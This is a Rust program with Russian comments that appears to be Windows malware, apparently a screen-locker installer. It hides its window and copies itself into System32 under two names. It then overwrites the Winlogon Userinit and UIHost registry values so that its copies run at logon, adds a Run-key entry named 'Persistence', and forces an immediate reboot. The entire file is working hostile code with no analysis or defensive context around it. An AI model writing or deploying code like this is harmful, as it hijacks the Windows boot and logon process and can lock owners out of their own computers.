#![windows_subsystem = "windows"]

use std::fs;
use std::path::PathBuf;
use winreg::RegKey;
use winreg::enums::*;

const VIDEO_BLOB: &[u8] = b"DUMMY_VIDEO_DATA";

fn main() {
    let sys = PathBuf::from(std::env::var("SYSTEMROOT").unwrap()).join("System32");
    
    // Список DLL для копирования
    let dlls = vec![
        "vcruntime140.dll",
        "vcruntime140_1.dll",
        "msvcp140.dll",
        "msvcp140_1.dll",
        "msvcp140_2.dll",
        "concrt140.dll",
        "api-ms-win-crt-runtime-l1-1-0.dll",
        "api-ms-win-crt-stdio-l1-1-0.dll",
        "api-ms-win-crt-heap-l1-1-0.dll",
        "api-ms-win-crt-locale-l1-1-0.dll",
        "api-ms-win-crt-math-l1-1-0.dll",
        "api-ms-win-crt-string-l1-1-0.dll",
        "api-ms-win-crt-time-l1-1-0.dll",
        "api-ms-win-crt-filesystem-l1-1-0.dll",
        "api-ms-win-crt-convert-l1-1-0.dll",
        "api-ms-win-crt-utility-l1-1-0.dll",
        "api-ms-win-crt-environment-l1-1-0.dll",
        "api-ms-win-crt-process-l1-1-0.dll"
    ];

    let dest_gate = sys.join("gate_keeper.exe");
    let dest_screen = sys.join("screen_holder.exe");
    let video_path = sys.join("video.mp4");

    // Копируем EXE
    let current_exe = std::env::current_exe().unwrap();
    let exe_dir = current_exe.parent().unwrap();
    
    let _ = fs::copy(&current_exe, &dest_gate);
    let _ = fs::copy(&current_exe, &dest_screen);
    
    // Копируем все DLL из папки с программой в System32
    for dll_name in &dlls {
        let src = exe_dir.join(dll_name);
        let dst = sys.join(dll_name);
        if src.exists() {
            let _ = fs::copy(&src, &dst);
            println!("Copied: {}", dll_name);
        } else {
            // Если DLL нет в папке с программой, пробуем скопировать из System32 в System32 (ничего не делает)
            // Или просто пропускаем
            println!("Skipped: {} (not found in current directory)", dll_name);
        }
    }

    // Создаём video.mp4
    let _ = fs::write(&video_path, VIDEO_BLOB);

    // Работа с реестром
    let hklm = RegKey::predef(HKEY_LOCAL_MACHINE);
    if let Ok(winlogon) = hklm.open_subkey_with_flags(
        "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon",
        KEY_SET_VALUE
    ) {
        let gate_val = dest_gate.to_str().unwrap().to_owned() + ",userinit.exe";
        let _ = winlogon.set_value("Userinit", &gate_val);
        let _ = winlogon.set_value("UIHost", &dest_screen.to_str().unwrap().to_owned());
    }

    if let Ok(run) = hklm.open_subkey_with_flags(
        "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
        KEY_SET_VALUE
    ) {
        let _ = run.set_value("Persistence", &dest_screen.to_str().unwrap().to_owned());
    }

    // Перезагрузка
    let _ = std::process::Command::new("shutdown")
        .args(["/r", "/t", "0", "/f"])
        .status();
}
